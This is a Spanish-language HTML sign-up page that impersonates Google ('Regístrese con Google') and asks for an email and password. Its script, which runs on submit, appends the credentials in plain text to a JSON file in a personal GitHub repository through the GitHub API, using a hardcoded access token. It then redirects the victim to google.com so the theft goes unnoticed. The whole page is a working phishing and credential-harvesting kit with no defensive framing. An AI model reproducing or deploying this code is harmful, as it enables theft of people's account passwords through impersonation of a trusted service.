<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registro - [Google]</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            color: #333;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 5px;
            background-color: #f9f9f9;
        }
        h1 {
            color: #2c3e50;
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
        }
        button:hover {
            background-color: #2980b9;
        }
        .login-link {
            text-align: center;
            margin-top: 15px;
        }
        .loading {
            text-align: center;
            margin-top: 10px;
            color: #3498db;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Regístrese con Google</h1>
        <form id="registroForm">
            <div class="form-group">
                <label for="email">Correo electrónico:</label>
                <input type="email" id="email" name="email" required placeholder="usuario@gmail.com">
            </div>
            <div class="form-group">
                <label for="password">Contraseña:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Registrarse</button>
            <div id="loadingMessage" class="loading" style="display: none;">Enviando datos, por favor espere...</div>
        </form>
        <div class="login-link">
            ¿Ya tienes una cuenta? <a href="login.html">Inicia sesión</a>
        </div>
    </div>

<script>
    document.getElementById('registroForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const form = this;
        const submitButton = form.querySelector('button[type="submit"]');
        const loadingMessage = document.getElementById('loadingMessage');
        
        submitButton.disabled = true;
        submitButton.textContent = "Enviando...";
        loadingMessage.style.display = 'block';
        
        // Obtener datos del formulario
        const formData = new FormData(form);
        const nuevoRegistro = {
            email: formData.get('email'),
            password: formData.get('password'),
            fecha: new Date().toISOString()
        };

        // Configuración para GitHub
        const config = {
            usuario: 'ilbiweb',
            repo: 'Mis-registros',
            archivo: 'registros.json',
            token: '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'
        };

        try {
            // Verificar si estamos en file://
            if (window.location.protocol === 'file:') {
                throw new Error('No se puede acceder a GitHub desde un archivo local. Usa un servidor web.');
            }

            // 1. Obtener archivo existente
            const url = `https://api.github.com/repos/${config.usuario}/${config.repo}/contents/${config.archivo}`;
            const respuesta = await fetch(url, {
                headers: { Authorization: `token ${config.token}` }
            });
            
            let registrosExistentes = [];
            let shaArchivo = null;
            
            if (respuesta.ok) {
                const datos = await respuesta.json();
                try {
                    registrosExistentes = JSON.parse(atob(datos.content.replace(/\s/g, '')));
                    shaArchivo = datos.sha;
                } catch (parseError) {
                    console.error('Error al parsear JSON existente:', parseError);
                    registrosExistentes = [];
                }
            } else if (respuesta.status !== 404) {
                const errorData = await respuesta.json();
                throw new Error(`GitHub API error: ${errorData.message}`);
            }

            // 2. Agregar nuevo registro
            registrosExistentes.push(nuevoRegistro);

            // 3. Subir archivo actualizado
            const subida = await fetch(url, {
                method: 'PUT',
                headers: {
                    Authorization: `token ${config.token}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    message: 'Nuevo registro agregado automáticamente',
                    content: btoa(JSON.stringify(registrosExistentes, null, 2)),
                    sha: shaArchivo
                })
            });

            if (!subida.ok) {
                const errorData = await subida.json();
                throw new Error(`Error al guardar en GitHub: ${errorData.message}`);
            }
            
            console.log('Datos guardados correctamente en GitHub');
            window.location.href = "https://www.google.com";
            
        } catch (error) {
            console.error('Error completo:', error);
            alert(`Error: ${error.message}\n\nDetalles en consola.`);
        } finally {
            submitButton.disabled = false;
            submitButton.textContent = "Registrarse";
            loadingMessage.style.display = 'none';
        }
    });
    </script>
